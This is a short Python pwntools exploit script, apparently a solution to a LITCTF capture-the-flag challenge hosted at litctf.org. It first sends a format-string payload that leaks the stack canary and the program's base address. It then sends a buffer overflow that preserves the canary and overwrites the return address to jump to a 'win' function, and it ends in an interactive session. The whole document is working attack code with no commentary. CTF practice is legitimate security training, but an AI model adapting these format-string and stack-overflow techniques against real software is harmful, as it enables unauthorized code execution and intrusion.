#!/usr/bin/python3

from pwn import *

exe = ELF('s', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''

                b* vuln +93
                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('litctf.org', 31791  )
else:
        p = process(exe.path)

GDB()
payload = b"%11$p|%13$p|"
sl(payload)
canary = int(p.recvuntil(b"|", drop=True).decode(), 16)
info("canary: " + hex(canary))
exe.address = int(p.recvuntil(b"|", drop=True).decode(), 16) - 0x12ae
info("exe base: " + hex(exe.address))
sleep(2)
payload = b"a" * 40 + p64(canary) + p64(0) + p64(exe.sym.win+5)
sl(payload)
p.interactive()
